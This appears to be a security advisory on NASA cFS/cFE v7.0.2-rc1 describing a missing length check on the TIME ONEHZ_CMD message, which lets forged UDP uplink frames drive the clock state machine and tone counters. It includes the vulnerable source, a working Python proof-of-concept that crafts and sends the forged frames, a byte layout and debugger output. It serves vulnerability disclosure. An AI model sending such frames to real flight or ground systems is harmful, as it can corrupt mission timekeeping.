### Overview

- Vendor : NASA
- Product : core Flight System (cFS) / TIME
- Version : cFE v7.0.2-rc1 as bundled in nasa/cFS v7.0.2-rc1 (commit 63b6f8d); the unguarded internal dispatch shape is present across the public 7.x history
- Vulnerability Class : Improper Input Validation (CWE-20)

### Description

A vulnerability was identified in NASA cFE v7.0.2-rc1. The affected branch is the ONEHZ_CMD branch of CFE_TIME_TaskPipe() of the file cfe/modules/time/fsw/src/cfe_time_dispatch.c. The branch passes the raw software bus message to CFE_TIME_OneHzCmd() without any length check, while every TIME ground command is first validated by CFE_TIME_VerifyCmdLength(). Any frame delivered to message ID 0x1811 therefore runs the once-per-second time state machine, whatever its declared length or content; the handler never reads the payload. The attack is possible to be carried out remotely over the command uplink, which in the stock bundle is ci_lab on UDP port 1234. ci_lab forwards every received datagram to the software bus without filtering by message ID. Its only length check rejects a packet whose declared length exceeds the received datagram, so an 8-byte declaration passes. The CCSDS command checksum is not verified by default. A forged frame is a forged tick of the system's once-per-second clock. That tick advances the time reference state machine and, in builds configured with the simulated tone signal, also stands in for the hardware tone interrupt. A ground sender can therefore advance the internal once-per-second schedule at attacker-chosen times, and state transitions such as entering fly-wheel mode follow the injected frames instead of the onboard clock. In the stock configuration, which enables the simulated tone signal, every forged frame additionally runs the emulated tone interrupt; each frame is judged against the one-second spacing limits, so the tone validity counters move at the attacker's send rate.

### Vulnerability details

The message ID of the branch is `0x1811`, `CFE_PLATFORM_TIME_CMD_MIDVAL(ONEHZ_CMD)`, the platform command base `0x1800` with topic 17. TIME subscribes this message ID on its command pipe; the software bus routing-table dump confirms the subscription.

`cfe/modules/time/fsw/src/cfe_time_dispatch.c:241-247` — no `VerifyCmdLength`:

```c
    if (CFE_SB_MsgId_Equal(MessageID, ONEHZ_CMD_MID))
    {
        CFE_TIME_OneHzCmd((const CFE_TIME_OneHzCmd_t *)SBBufPtr);
    }
```

`CFE_TIME_OneHzCmd()` at `cfe_time_task.c:481-502` does not touch its payload — the `data` parameter is unused — and runs the once-per-second work:

```c
    CFE_TIME_Local1HzStateMachine();
#if (CFE_MISSION_TIME_CFG_FAKE_TONE == true)
    CFE_TIME_Tone1HzISR();
#endif
```

Configuration-dependent behavior:

- In the stock sample configuration, which enables `CFE_MISSION_TIME_CFG_FAKE_TONE` (`example_mission_cfg.h:443`), every ground-injected frame additionally runs `CFE_TIME_Tone1HzISR()` — the software stand-in for the hardware tone interrupt. The function latches the local clock, judges the spacing from the previous tone latch against the one-second limits, increments `ToneIntCounter` on a pass or `ToneIntErrorCounter` on a failure, and sets the tone-valid flag accordingly; frames injected at attacker-chosen intervals drive this judgment and the counters from the ground.
- In every build, `CFE_TIME_Local1HzStateMachine()` advances the time reference state machine — including the autonomous transition into fly-wheel mode — so the once-per-second steps execute when frames arrive.

The branch belongs to the unguarded internal family: `DATA_CMD` at line 255, `TONE_CMD` at line 262 and `SEND_CMD` at line 270, the last compiled only in `CFE_PLATFORM_TIME_CFG_SERVER` builds.

### PoC

Environment: nasa/cFS v7.0.2-rc1 native pc-linux build, stock startup script, command ingest on UDP/1234.

```python
#!/usr/bin/env python3
# CFE_TIME_OneHzCmd command length validation bypass - minimal PoC
# Target : NASA cFS v7.0.2-rc1, stock bundle running in the foreground
# Run    : python3 poc_onehz.py [--ip=127.0.0.1] [--port=1234] [--count=10]
# Expect : every frame is consumed in silence and no rejection event is printed;
#          on an instance traced at CFE_TIME_OneHzCmd the entry count
#          jumps by count on top of the once-per-second baseline
import socket
import struct
import sys
import time

TARGET_MID = 0x1811  # CFE_PLATFORM_TIME_CMD_MIDVAL(ONEHZ_CMD)


def frame():
    """ONEHZ_CMD declaring a payload length of 1 - a bare 8-byte CCSDS header -
    followed by 8 marker bytes carried beyond the declared message."""
    p = struct.pack(">HHHBB", TARGET_MID, 0xC000, 1, 0, 0)
    c = 0xFF
    for b in p:
        c ^= b
    return p[:7] + bytes([c]) + b"\xAB" * 8


def main():
    ip, port, count = "127.0.0.1", 1234, 10
    for a in sys.argv[1:]:
        k, _, v = a.lstrip("-").partition("=")
        if k == "ip":
            ip = v
        elif k == "port":
            port = int(v)
        elif k == "count":
            count = int(v)

    pkt = frame()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(count):
        s.sendto(pkt, (ip, port))
        print("tx", pkt.hex())
        time.sleep(0.1)


if __name__ == "__main__":
    main()
```

| offset | field | value | meaning |
|---|---|---|---|
| 0-1 | message ID | `0x1811` | TIME ONEHZ_CMD |
| 2-3 | sequence | `0xC000` | unsegmented sequence flag |
| 4-5 | length | `0x0001` | CCSDS length field = total - 7, so the packet declares 8 bytes |
| 6 | function code | `0x00` | |
| 7 | checksum | `0x37` | |
| 8-15 | trailing bytes | `AB` x8 | markers beyond the declared message |

The frame is 16 bytes long, so eight bytes are carried beyond what the header declares: the length field declares 1, i.e. a message of 8 bytes, and the eight `0xAB` markers sit beyond it while the handler accepts the frame without reading them.

### Observation

The observation uses a breakpoint on CFE_TIME_OneHzCmd(). The instance runs under the attached gdb script probe_onehz.gdb, which prints one line for every entry into the handler with a running count; the breakpoint only prints and does not participate in the delivery:

```
gdb -nx -batch -x probe_onehz.gdb --args ./core-cpu1
```

The PoC of the previous section delivers its ten frames while this console is running. The baseline is about one line per second, produced by the internal 1 Hz task of TIME, interleaved with the periodic Start/Stop FLYWHEEL events of the time state machine.

![1795094199697](image/CFE_TIME_OneHzCmd/1795094199697.png)

Between the two marked timestamps, 14:28:00.28 and 14:28:03.00, fourteen handler lines appear in under three seconds: the ten injected frames on top of the once-per-second baseline, each accepted and consumed in silence, with no rejection event anywhere in the capture.

The same frame shape sent to a ground command of the same application produces the opposite outcome. The contrast uses SET_SOURCE of TIME, function code 4 at message ID 0x1805, delivered by the attached send_hdr_frames.py --mid=0x1805 --fc=4. No new handler line appears and the console prints the rejection event instead:

```
EVS Port1 1980-012-14:05:12.63174 66/1/CFE_TIME 49: Invalid msg length: ID = 0x1805,  CC = 4, Len = 8, Expected = 10
```

![1795094413101](image/CFE_TIME_OneHzCmd/1795094413101.png)

The capture shows the rejection event printed between handler lines: the ground-command branch rejects the frame on length before its handler runs, while the internal ONEHZ_CMD branch accepts the identical shape without any check.
